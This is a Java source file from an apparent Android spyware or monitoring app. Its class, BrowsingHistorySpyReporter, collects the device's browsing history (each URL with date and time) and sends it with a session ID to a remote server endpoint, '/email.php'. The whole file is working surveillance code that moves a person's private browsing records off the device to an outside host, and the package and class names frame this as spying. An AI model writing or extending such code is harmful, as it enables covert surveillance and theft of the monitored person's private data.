package th.ac.bu.mcop.android.spy.reporter;

import java.util.HashMap;
import java.util.Map;

import th.ac.bu.mcop.http.core.connection.Request;
import th.ac.bu.mcop.mobile.monitor.core.Report;
import th.ac.bu.mcop.mobile.monitor.report.BrowsingHistory;
import th.ac.bu.mcop.mobile.monitor.report.BrowsingUrl;

public class BrowsingHistorySpyReporter extends SpyReporter {

	@Override
	protected Request createRequest(Report report) {
		BrowsingHistory history = (BrowsingHistory) report;
		StringBuilder content = new StringBuilder();
		for (BrowsingUrl url : history.urls) {
			String date = LOG_DATE_FORMAT.format(url.date);
			String time = LOG_TIME_FORMAT.format(url.date);
			content.append(date + "\t" + time + "\t" + url.url + "\r");
		}
		Map<String, String> parameters = new HashMap<String, String>();
		parameters.put("sID", getSession());
		parameters.put("content", content.toString());
		return new Request(WEBAPI_SERVER_ROOT + "/email.php", parameters);
	}
}
